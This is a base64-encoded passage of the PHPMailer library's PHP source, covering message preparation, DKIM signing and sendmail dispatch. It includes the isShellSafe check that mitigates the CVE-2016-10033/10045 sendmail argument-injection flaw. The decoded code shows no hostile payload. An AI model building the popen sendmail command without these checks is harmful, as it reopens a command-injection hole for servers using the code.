ChlLmcuIGRvbWFpbiBoYXMgY2hhcmFjdGVycyBub3QgYWxsb3dlZCBpbiBhbiBJRE4pDQogICAgICogQHNlZSBQSFBNYWlsZXI6OiRDaGFyU2V0DQogICAgICogQHBhcmFtIHN0cmluZyAkYWRkcmVzcyBUaGUgZW1haWwgYWRkcmVzcyB0byBjb252ZXJ0DQogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGVuY29kZWQgYWRkcmVzcyBpbiBBU0NJSSBmb3JtDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHB1bnllbmNvZGVBZGRyZXNzKCRhZGRyZXNzKQ0KICAgIHsNCiAgICAgICAgLy8gVmVyaWZ5IHdlIGhhdmUgcmVxdWlyZWQgZnVuY3Rpb25zLCBDaGFyU2V0LCBhbmQgYXQtc2lnbi4NCiAgICAgICAgaWYgKCR0aGlzLT5pZG5TdXBwb3J0ZWQoKSBhbmQNCiAgICAgICAgICAgICFlbXB0eSgkdGhpcy0+Q2hhclNldCkgYW5kDQogICAgICAgICAgICAoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgJGRvbWFpbiA9IHN1YnN0cigkYWRkcmVzcywgKyskcG9zKTsNCiAgICAgICAgICAgIC8vIFZlcmlmeSBDaGFyU2V0IHN0cmluZyBpcyBhIHZhbGlkIG9uZSwgYW5kIGRvbWFpbiBwcm9wZXJseSBlbmNvZGVkIGluIHRoaXMgQ2hhclNldC4NCiAgICAgICAgICAgIGlmICgkdGhpcy0+aGFzOGJpdENoYXJzKCRkb21haW4pIGFuZCBAbWJfY2hlY2tfZW5jb2RpbmcoJGRvbWFpbiwgJHRoaXMtPkNoYXJTZXQpKSB7DQogICAgICAgICAgICAgICAgJGRvbWFpbiA9IG1iX2NvbnZlcnRfZW5jb2RpbmcoJGRvbWFpbiwgJ1VURi04JywgJHRoaXMtPkNoYXJTZXQpOw0KICAgICAgICAgICAgICAgIGlmICgoJHB1bnljb2RlID0gZGVmaW5lZCgnSU5UTF9JRE5BX1ZBUklBTlRfVVRTNDYnKSA/DQogICAgICAgICAgICAgICAgICAgIGlkbl90b19hc2NpaSgkZG9tYWluLCAwLCBJTlRMX0lETkFfVkFSSUFOVF9VVFM0NikgOg0KICAgICAgICAgICAgICAgICAgICBpZG5fdG9fYXNjaWkoJGRvbWFpbikpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3Vic3RyKCRhZGRyZXNzLCAwLCAkcG9zKSAuICRwdW55Y29kZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRhZGRyZXNzOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIENyZWF0ZSBhIG1lc3NhZ2UgYW5kIHNlbmQgaXQuDQogICAgICogVXNlcyB0aGUgc2VuZGluZyBtZXRob2Qgc3BlY2lmaWVkIGJ5ICRNYWlsZXIuDQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24NCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gZmFsc2Ugb24gZXJyb3IgLSBTZWUgdGhlIEVycm9ySW5mbyBwcm9wZXJ0eSBmb3IgZGV0YWlscyBvZiB0aGUgZXJyb3IuDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHNlbmQoKQ0KICAgIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghJHRoaXMtPnByZVNlbmQoKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+cG9zdFNlbmQoKTsNCiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBQcmVwYXJlIGEgbWVzc2FnZSBmb3Igc2VuZGluZy4NCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbg0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBwcmVTZW5kKCkNCiAgICB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkdGhpcy0+ZXJyb3JfY291bnQgPSAwOyAvLyBSZXNldCBlcnJvcnMNCiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7DQoNCiAgICAgICAgICAgIC8vIERlcXVldWUgcmVjaXBpZW50IGFuZCBSZXBseS1UbyBhZGRyZXNzZXMgd2l0aCBJRE4NCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X21lcmdlKCR0aGlzLT5SZWNpcGllbnRzUXVldWUsICR0aGlzLT5SZXBseVRvUXVldWUpIGFzICRwYXJhbXMpIHsNCiAgICAgICAgICAgICAgICAkcGFyYW1zWzFdID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCRwYXJhbXNbMV0pOw0KICAgICAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KGFycmF5KCR0aGlzLCAnYWRkQW5BZGRyZXNzJyksICRwYXJhbXMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+dG8pICsgY291bnQoJHRoaXMtPmNjKSArIGNvdW50KCR0aGlzLT5iY2MpKSA8IDEpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdwcm92aWRlX2FkZHJlc3MnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIFZhbGlkYXRlIEZyb20sIFNlbmRlciwgYW5kIENvbmZpcm1SZWFkaW5nVG8gYWRkcmVzc2VzDQogICAgICAgICAgICBmb3JlYWNoIChhcnJheSgnRnJvbScsICdTZW5kZXInLCAnQ29uZmlybVJlYWRpbmdUbycpIGFzICRhZGRyZXNzX2tpbmQpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9IHRyaW0oJHRoaXMtPiRhZGRyZXNzX2tpbmQpOw0KICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+JGFkZHJlc3Nfa2luZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCR0aGlzLT4kYWRkcmVzc19raW5kKTsNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7DQogICAgICAgICAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gJyAocHVueUVuY29kZSkgJyAuICR0aGlzLT4kYWRkcmVzc19raW5kOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBTZXQgd2hldGhlciB0aGUgbWVzc2FnZSBpcyBtdWx0aXBhcnQvYWx0ZXJuYXRpdmUNCiAgICAgICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5Db250ZW50VHlwZSA9ICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmUnOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkdGhpcy0+c2V0TWVzc2FnZVR5cGUoKTsNCiAgICAgICAgICAgIC8vIFJlZnVzZSB0byBzZW5kIGFuIGVtcHR5IG1lc3NhZ2UgdW5sZXNzIHdlIGFyZSBzcGVjaWZpY2FsbHkgYWxsb3dpbmcgaXQNCiAgICAgICAgICAgIGlmICghJHRoaXMtPkFsbG93RW1wdHkgYW5kIGVtcHR5KCR0aGlzLT5Cb2R5KSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VtcHR5X21lc3NhZ2UnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIC8vIENyZWF0ZSBib2R5IGJlZm9yZSBoZWFkZXJzIGluIGNhc2UgYm9keSBtYWtlcyBjaGFuZ2VzIHRvIGhlYWRlcnMgKGUuZy4gYWx0ZXJpbmcgdHJhbnNmZXIgZW5jb2RpbmcpDQogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICcnOw0KICAgICAgICAgICAgJHRoaXMtPk1JTUVCb2R5ID0gJHRoaXMtPmNyZWF0ZUJvZHkoKTsNCiAgICAgICAgICAgIC8vIGNyZWF0ZUJvZHkgbWF5IGhhdmUgYWRkZWQgc29tZSBoZWFkZXJzLCBzbyByZXRhaW4gdGhlbQ0KICAgICAgICAgICAgJHRlbXBoZWFkZXJzID0gJHRoaXMtPk1JTUVIZWFkZXI7DQogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICR0aGlzLT5jcmVhdGVIZWFkZXIoKTsNCiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyIC49ICR0ZW1waGVhZGVyczsNCg0KICAgICAgICAgICAgLy8gVG8gY2FwdHVyZSB0aGUgY29tcGxldGUgbWVzc2FnZSB3aGVuIHVzaW5nIG1haWwoKSwgY3JlYXRlDQogICAgICAgICAgICAvLyBhbiBleHRyYSBoZWFkZXIgbGlzdCB3aGljaCBjcmVhdGVIZWFkZXIoKSBkb2Vzbid0IGZvbGQgaW4NCiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdtYWlsJykgew0KICAgICAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+YWRkckFwcGVuZCgnVG8nLCAkdGhpcy0+dG8pOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgLj0gJHRoaXMtPmhlYWRlckxpbmUoDQogICAgICAgICAgICAgICAgICAgICdTdWJqZWN0JywNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKHRyaW0oJHRoaXMtPlN1YmplY3QpKSkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAvLyBTaWduIHdpdGggREtJTSBpZiBlbmFibGVkDQogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5ES0lNX2RvbWFpbikNCiAgICAgICAgICAgICAgICBhbmQgIWVtcHR5KCR0aGlzLT5ES0lNX3NlbGVjdG9yKQ0KICAgICAgICAgICAgICAgIGFuZCAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKQ0KICAgICAgICAgICAgICAgICAgICBvciAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGUpDQogICAgICAgICAgICAgICAgICAgICAgICBhbmQgc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCR0aGlzLT5ES0lNX3ByaXZhdGUpDQogICAgICAgICAgICAgICAgICAgICAgICBhbmQgZmlsZV9leGlzdHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSkNCiAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICkNCiAgICAgICAgICAgICkgew0KICAgICAgICAgICAgICAgICRoZWFkZXJfZGtpbSA9ICR0aGlzLT5ES0lNX0FkZCgNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLiAkdGhpcy0+bWFpbEhlYWRlciwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVuY29kZUhlYWRlcigkdGhpcy0+c2VjdXJlSGVhZGVyKCR0aGlzLT5TdWJqZWN0KSksDQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSBydHJpbSgkdGhpcy0+TUlNRUhlYWRlciwgIg0KICIpIC4gc2VsZjo6Q1JMRiAuDQogICAgICAgICAgICAgICAgICAgIHN0cl9yZXBsYWNlKCINCiIsICINCiIsICRoZWFkZXJfZGtpbSkgLiBzZWxmOjpDUkxGOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0gY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93ICRleGM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBY3R1YWxseSBzZW5kIGEgbWVzc2FnZS4NCiAgICAgKiBTZW5kIHRoZSBlbWFpbCB2aWEgdGhlIHNlbGVjdGVkIG1lY2hhbmlzbQ0KICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIHBvc3RTZW5kKCkNCiAgICB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAvLyBDaG9vc2UgdGhlIG1haWxlciBhbmQgc2VuZCB0aHJvdWdoIGl0DQogICAgICAgICAgICBzd2l0Y2ggKCR0aGlzLT5NYWlsZXIpIHsNCiAgICAgICAgICAgICAgICBjYXNlICdzZW5kbWFpbCc6DQogICAgICAgICAgICAgICAgY2FzZSAncW1haWwnOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRtYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICBjYXNlICdzbXRwJzoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICBjYXNlICdtYWlsJzoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICAkc2VuZE1ldGhvZCA9ICR0aGlzLT5NYWlsZXIuJ1NlbmQnOw0KICAgICAgICAgICAgICAgICAgICBpZiAobWV0aG9kX2V4aXN0cygkdGhpcywgJHNlbmRNZXRob2QpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPiRzZW5kTWV0aG9kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogU2VuZCBtYWlsIHVzaW5nIHRoZSAkU2VuZG1haWwgcHJvZ3JhbS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycw0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQ0KICAgICAqIEBzZWUgUEhQTWFpbGVyOjokU2VuZG1haWwNCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbg0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNlbmRtYWlsU2VuZCgkaGVhZGVyLCAkYm9keSkNCiAgICB7DQogICAgICAgIC8vIENWRS0yMDE2LTEwMDMzLCBDVkUtMjAxNi0xMDA0NTogRG9uJ3QgcGFzcyAtZiBpZiBjaGFyYWN0ZXJzIHdpbGwgYmUgZXNjYXBlZC4NCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcpIHsNCiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLWYlcyc7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLWYlcyAtdCc7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAncW1haWwnKSB7DQogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1vaSAtdCc7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyBUT0RPOiBJZiBwb3NzaWJsZSwgdGhpcyBzaG91bGQgYmUgY2hhbmdlZCB0byBlc2NhcGVzaGVsbGFyZy4gIE5lZWRzIHRob3JvdWdoIHRlc3RpbmcuDQogICAgICAgICRzZW5kbWFpbCA9IHNwcmludGYoJHNlbmRtYWlsRm10LCBlc2NhcGVzaGVsbGNtZCgkdGhpcy0+U2VuZG1haWwpLCAkdGhpcy0+U2VuZGVyKTsNCg0KICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvKSB7DQogICAgICAgICAgICBmb3JlYWNoICgkdGhpcy0+U2luZ2xlVG9BcnJheSBhcyAkdG9BZGRyKSB7DQogICAgICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICdUbzogJyAuICR0b0FkZHIgLiAiDQoiKTsNCiAgICAgICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7DQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICRib2R5KTsNCiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygNCiAgICAgICAgICAgICAgICAgICAgKCRyZXN1bHQgPT0gMCksDQogICAgICAgICAgICAgICAgICAgIGFycmF5KCR0b0FkZHIpLA0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y2MsDQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5iY2MsDQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LA0KICAgICAgICAgICAgICAgICAgICAkYm9keSwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkZyb20NCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgIGlmICgkcmVzdWx0ICE9IDApIHsNCiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7DQogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGJvZHkpOw0KICAgICAgICAgICAgJHJlc3VsdCA9IHBjbG9zZSgkbWFpbCk7DQogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygNCiAgICAgICAgICAgICAgICAoJHJlc3VsdCA9PSAwKSwNCiAgICAgICAgICAgICAgICAkdGhpcy0+dG8sDQogICAgICAgICAgICAgICAgJHRoaXMtPmNjLA0KICAgICAgICAgICAgICAgICR0aGlzLT5iY2MsDQogICAgICAgICAgICAgICAgJHRoaXMtPlN1YmplY3QsDQogICAgICAgICAgICAgICAgJGJvZHksDQogICAgICAgICAgICAgICAgJHRoaXMtPkZyb20NCiAgICAgICAgICAgICk7DQogICAgICAgICAgICBpZiAoJHJlc3VsdCAhPSAwKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBGaXggQ1ZFLTIwMTYtMTAwMzMgYW5kIENWRS0yMDE2LTEwMDQ1IGJ5IGRpc2FsbG93aW5nIHBvdGVudGlhbGx5IHVuc2FmZSBzaGVsbCBjaGFyYWN0ZXJzLg0KICAgICAqDQogICAgICogTm90ZSB0aGF0IGVzY2FwZXNoZWxsYXJnIGFuZCBlc2NhcGVzaGVsbGNtZCBhcmUgaW5hZGVxdWF0ZSBmb3Igb3VyIHB1cnBvc2VzLCBlc3BlY2lhbGx5IG9uIFdpbmRvd3MuDQogICAgICogQHBhcmFtIHN0cmluZyAkc3RyaW5nIFRoZSBzdHJpbmcgdG8gYmUgdmFsaWRhdGVkDQogICAgICogQHNlZSBodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlci9pc3N1ZXMvOTI0IENWRS0yMDE2LTEwMDQ1IGJ1ZyByZXBvcnQNCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqLw0KICAgIHByb3RlY3RlZCBzdGF0aWMgZnVuY3Rpb24gaXNTaGVsbFNhZmUoJHN0cmluZykNCiAgICB7DQogICAgICAgIC8vIEZ1dHVyZS1wcm9vZg0KICAgICAgICBpZiAoZXNjYXBlc2hlbGxjbWQoJHN0cmluZykgIT09ICRzdHJpbmcNCiAgICAgICAgICAgIG9yICFpbl9hcnJheShlc2NhcGVzaGVsbGFyZygkc3RyaW5nKSwgYXJyYXkoIickc3RyaW5nJyIsICJcIiRzdHJpbmdcIiIpKQ0KICAgICAgICApIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KDQogICAgICAgICRsZW5ndGggPSBzdHJsZW4oJHN0cmluZyk7DQoNCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgew0KICAgICAgICAgICAgJGMgPSAkc3RyaW5nWyRpXTsNCg0KICAgICAgICAgICAgLy8gQWxsIG90aGVyIGNoYXJhY3RlcnMgaGF2ZSBhIHNwZWNpYWwgbWVhbmluZyBpbiBhdCBsZWFzdCBvbmUgY29tbW9uIHNoZWxsLCBpbmNsdWRpbmcgPSBhbmQgKy4NCiAgICAgICAgICAgIC8vIEZ1bGwgc3RvcCAoLikgaGFzIGEgc3BlY2lhbCBtZWFuaW5nIGluIGNtZC5leGUsIGJ1dCBpdHMgaW1wYWN0IHNob3VsZCBiZSBuZWdsaWdpYmxlIGhlcmUuDQogICAgICAgICAgICAvLyBOb3RlIHRoYXQgdGhpcyBkb2VzIHBlcm1pdCBub24tTGF0aW4gYWxwaGFudW1lcmljIGNoYXJhY3RlcnMgYmFzZWQgb24gdGhlIGN1cnJlbnQgbG9jYWxlLg0KICAgICAgICAgICAgaWYgKCFjdHlwZV9hbG51bSgkYykgJiYgc3RycG9zKCdAXy0uJywgJGMpID09PSBmYWxzZSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIENoZWNrIHdoZXRoZXIgYSBmaWxlIHBhdGggaXMgb2YgYSBwZXJtaXR0ZWQgdHlwZS4NCiAgICAgKiBVc2VkIHRvIHJlamVjdCBVUkxzIGFuZCBwaGFyIGZpbGVzIGZyb20gZnVuY3Rpb25zIHRoYXQgYWNjZXNzIGxvY2FsIGZpbGUgcGF0aHMsDQogICAgICogc3VjaCBhcyBhZGRBdHRhY2htZW50Lg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggQSByZWxhdGl2ZSBvciBhYnNvbHV0ZSBwYXRoIHRvIGEgZmlsZS4NCiAgICAgKiBAcmV0dXJuIGJvb2wNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgc3RhdGljIGZ1bmN0aW9uIGlzUGVybWl0dGVkUGF0aCgkcGF0aCkNCiAgICB7DQogICAgICAgIHJldHVybiAhcHJlZ19tYXRjaCgnI15bYS16XSs6Ly8jaScsICRwYXRoKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBTZW5kIG1haWwgdXNpbmcgdGhlIFBIUCBtYWlsKCkgZnVuY3Rpb24uDQogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IFRoZSBtZXNzYWdlIGJvZHkNCiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Jvb2subWFpbC5waHANCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbg0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIG1haWxTZW5kKCRoZWFkZXIsICRib2R5KQ0KICAgIHsNCiAgICAgICAgJHRvQXJyID0gYXJyYXkoKTsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsNCiAgICAg